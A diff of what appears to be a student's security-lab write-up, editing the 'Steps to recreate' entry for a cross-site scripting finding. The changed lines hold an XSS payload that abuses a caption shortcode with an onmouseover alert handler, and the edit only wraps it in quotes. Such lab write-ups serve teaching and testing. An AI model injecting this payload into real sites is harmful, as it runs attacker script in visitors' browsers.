@@ -14,8 +14,8 @@ Time spent: 5 hours spent in total
   - [ ] GIF Walkthrough: 
   - [ ] Steps to recreate: 
   
-    [caption width="3" caption='<a href="' ">]</a><a href="http://onmouseover='alert(1)'">Xss Here!</a>
-
+    "[caption width="3" caption='<a href="' ">]</a><a href="http://onmouseover='alert(1)'">Xss Here!</a>"
+   
     When a user hovers over the text characters, the injected code is executed.
 
   - [ ] Affected source code:
